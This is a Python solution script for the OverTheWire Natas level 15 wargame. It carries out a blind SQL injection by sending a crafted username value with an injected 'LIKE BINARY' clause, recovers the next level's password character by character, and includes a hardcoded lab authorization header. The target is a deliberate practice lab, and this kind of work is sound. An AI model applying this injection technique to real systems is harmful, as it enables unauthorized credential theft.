

# https://stackoverflow.com/questions/2069186/php-select-from-mysql-where-title-begins-with-a-and-a-alone/2069196#2069196
# https://stackoverflow.com/questions/15504554/sql-vs-like-vs-like-binary-not-case-sensitive

from string import digits
from string import ascii_letters
import requests

# ZAP Proxy
proxies = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}

def pwCharGenerator():
    for c in (digits + ascii_letters):
        yield c

password = ""
for i in range(0, 32):
    password += 'a'
    generator = pwCharGenerator()
    pwCharFound = False
    for c in generator:
        password = password[:-1] + c
        r = requests.post(
            'http://natas15.natas.labs.overthewire.org/index.php',
            proxies=proxies,
            headers= {
                'Host': 'natas15.natas.labs.overthewire.org',
                'Authorization' : 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
            },
            data = {
                'username' : 'natas16" AND password LIKE BINARY "' + password + '%" # comment'
            }
        )

        if "This user exists" in r.text:
            pwCharFound = True
            print(password)
            break
    assert(pwCharFound)

print("Password Found!")
print("Credentials for Natas16:")
print("UN: natas16")
print("PW: " + password)
